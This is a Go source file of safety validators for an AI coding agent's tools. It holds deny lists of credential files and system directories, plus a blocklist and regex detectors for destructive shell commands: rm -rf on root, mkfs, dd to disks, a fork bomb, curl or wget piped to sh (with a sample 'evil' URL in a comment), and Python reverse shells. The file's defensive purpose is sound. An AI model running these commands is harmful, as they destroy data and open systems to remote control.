package tool

import (
	"fmt"
	"net/url"
	"path/filepath"
	"regexp"
	"strings"
)

// sensitiveFileNames are exact file names that should be rejected for write/edit.
var sensitiveFileNames = []string{
	".env",
	".env.local",
	".env.production",
	".env.development",
	".env.staging",
	"credentials.json",
	"secrets.json",
	"secrets.yaml",
	"secrets.yml",
	"id_rsa",
	"id_ed25519",
	"id_ecdsa",
	"id_dsa",
	".npmrc",  // may contain auth tokens
	".pypirc", // may contain auth tokens
	".netrc",  // may contain credentials
	"token.json",
}

var sensitivePathSuffixes = []string{
	string(filepath.Separator) + ".docker" + string(filepath.Separator) + "config.json",
}

// sensitiveExtensions are file extensions that should be rejected for write/edit.
var sensitiveExtensions = []string{
	".pem",
	".key",
	".p12",
	".pfx",
	".keystore",
}

// sensitiveDirs are directory prefixes that should be rejected for write/edit.
var sensitiveDirs = []string{
	"/etc/",
	"/usr/",
	"/bin/",
	"/sbin/",
	"/boot/",
	"/System/",
	"/Library/",
}

// validateResolvedWritePath performs final write/edit denylist checks on a
// canonical absolute path. Workspace confinement and symlink resolution happen
// before this function via permission.NormalizePath.
func validateResolvedWritePath(path string) error {
	cleaned := filepath.Clean(path)
	// Reject sensitive system directories.
	for _, dir := range sensitiveDirs {
		if strings.HasPrefix(cleaned, dir) {
			return fmt.Errorf("refusing to modify file in system directory: %s", path)
		}
	}

	// Reject sensitive file names.
	base := filepath.Base(cleaned)
	for _, name := range sensitiveFileNames {
		if base == name {
			return fmt.Errorf("refusing to modify sensitive file: %s", path)
		}
	}
	for _, suffix := range sensitivePathSuffixes {
		if strings.HasSuffix(cleaned, suffix) {
			return fmt.Errorf("refusing to modify sensitive file: %s", path)
		}
	}

	// Reject sensitive file extensions.
	ext := filepath.Ext(cleaned)
	for _, sensExt := range sensitiveExtensions {
		if ext == sensExt {
			return fmt.Errorf("refusing to modify sensitive file: %s", path)
		}
	}

	return nil
}

// validatePath is kept for older tests and package-local callers. New write
// paths should use resolveToolPath so traversal, symlinks, and workspace
// confinement are handled consistently.
func validatePath(path string) error {
	return validateResolvedWritePath(path)
}

// dangerousCommandStrings are substrings that indicate dangerous commands.
var dangerousCommandStrings = []string{
	"mkfs.",
	"mkfs ",
	"> /dev/sd",
	"> /dev/nvme",
	"> /dev/disk",
	"> /etc/",
	":(){:|:&};:",
}

// dangerousPatterns are compiled regexes for dangerous shell command
// patterns. All patterns use (?is) — case-insensitive plus DOTALL — so
// mixed-case inputs like "Curl http://evil/script.sh | sh" can't slip
// past, and a literal newline between the pipe and `sh` ("curl … |\nsh")
// no longer breaks the match.
//
// IMPORTANT: this is a defense-in-depth heuristic, NOT the security
// boundary. A motivated adversary can trivially evade regex pattern
// matching via shell features the regex can't reason about — variable
// substitution (`r=rm; $r -rf /`), command substitution (`$(echo rm)
// -rf /`), base64-decode pipelines, eval, here-docs, etc. The actual
// security boundary is the per-tool permission gate: every bash command
// is forwarded to the user via canUseTool (see cmd/prompto/main.go) and
// must be explicitly approved before execution. This regex set catches
// only the most obvious footguns to surface "are you sure?" friction
// for the user, not to authorize the call.
var dangerousPatterns = []*regexp.Regexp{
	// rm -rf / or rm -rf ~ or rm -rf $HOME (combined flag, either order)
	regexp.MustCompile(`(?is)\brm\s+-\w*r\w*f\w*\s+[/~$]`),
	regexp.MustCompile(`(?is)\brm\s+-\w*f\w*r\w*\s+[/~$]`),
	// rm with split short flags: `rm -r -f /` / `rm -f -r ~`. The
	// inner `(?:-\w+\s+)*` swallows any other flags between the two.
	regexp.MustCompile(`(?is)\brm\s+-\w*r\w*\s+(?:-\w+\s+)*-\w*f\w*\s+(?:-\w+\s+)*[/~$]`),
	regexp.MustCompile(`(?is)\brm\s+-\w*f\w*\s+(?:-\w+\s+)*-\w*r\w*\s+(?:-\w+\s+)*[/~$]`),
	// rm with long-form flags: `rm --recursive --force /`, either order.
	regexp.MustCompile(`(?is)\brm\b[^|&;\n]*--recursive\b[^|&;\n]*--force\b[^|&;\n]*\s[/~$]`),
	regexp.MustCompile(`(?is)\brm\b[^|&;\n]*--force\b[^|&;\n]*--recursive\b[^|&;\n]*\s[/~$]`),
	// Raw disk writes via dd
	regexp.MustCompile(`(?is)\bdd\b.*of=/dev/`),
	// Recursive chmod 777 on root
	regexp.MustCompile(`(?is)\bchmod\b.*-.*R.*777\s+/`),
	// Curl/wget piped to shell (DOTALL covers a newline between pipe and sh)
	regexp.MustCompile(`(?is)\b(curl|wget)\b.*\|\s*(sudo\s+)?(ba)?sh\b`),
	// Shutdown/reboot/halt
	regexp.MustCompile(`(?is)\b(shutdown|reboot|halt|poweroff)\b`),
	// Python reverse shells
	regexp.MustCompile(`(?is)\bpython[23]?\b.*\bsocket\b.*\bconnect\b`),
}

// validateCommand performs heuristic sanity checks on a shell command.
// Returns an error when the command matches obviously-destructive
// patterns. See dangerousPatterns' doc-comment: this is defense-in-depth,
// not the security boundary — user approval (canUseTool) is.
func validateCommand(command string) error {
	// Check simple substring matches first. dangerousCommandStrings is
	// already lowercase ASCII, so the per-iteration ToLower(pattern)
	// that used to live here was redundant work.
	lower := strings.ToLower(command)
	for _, pattern := range dangerousCommandStrings {
		if strings.Contains(lower, pattern) {
			return fmt.Errorf("refusing to execute potentially dangerous command: %s", command)
		}
	}

	// Check regex patterns.
	for _, re := range dangerousPatterns {
		if re.MatchString(command) {
			return fmt.Errorf("refusing to execute potentially dangerous command: %s", command)
		}
	}

	return nil
}

// validateGrepPattern checks a grep pattern for ReDoS-prone constructs.
// Returns an error if the pattern could cause excessive backtracking.
func validateGrepPattern(pattern string) error {
	// Reject excessively long patterns.
	if len(pattern) > 1000 {
		return fmt.Errorf("pattern is too long (%d chars, max 1000)", len(pattern))
	}

	// Reject patterns with nested quantifiers (ReDoS risk).
	// Matches things like (a+)+, (a*)+, (a+)*, (.+)+ etc.
	nestedQuantifier := regexp.MustCompile(`\([^)]*[+*][^)]*\)[+*]`)
	if nestedQuantifier.MatchString(pattern) {
		return fmt.Errorf("pattern contains nested quantifiers which may cause excessive backtracking: %s", pattern)
	}

	return nil
}

// validateURL checks that a URL is safe to fetch.
// Rejects non-HTTP schemes (file://, javascript:, data:, etc.) and invalid URLs.
func validateURL(rawURL string) error {
	if rawURL == "" {
		return fmt.Errorf("url is required")
	}

	if len(rawURL) > 2048 {
		return fmt.Errorf("url is too long (%d chars, max 2048)", len(rawURL))
	}

	u, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("invalid url: %w", err)
	}

	switch u.Scheme {
	case "http", "https":
		// allowed
	case "":
		return fmt.Errorf("url must include a scheme (http:// or https://)")
	default:
		return fmt.Errorf("url scheme %q is not allowed — only http and https are supported", u.Scheme)
	}

	if u.Host == "" {
		return fmt.Errorf("url must include a host")
	}

	return nil
}
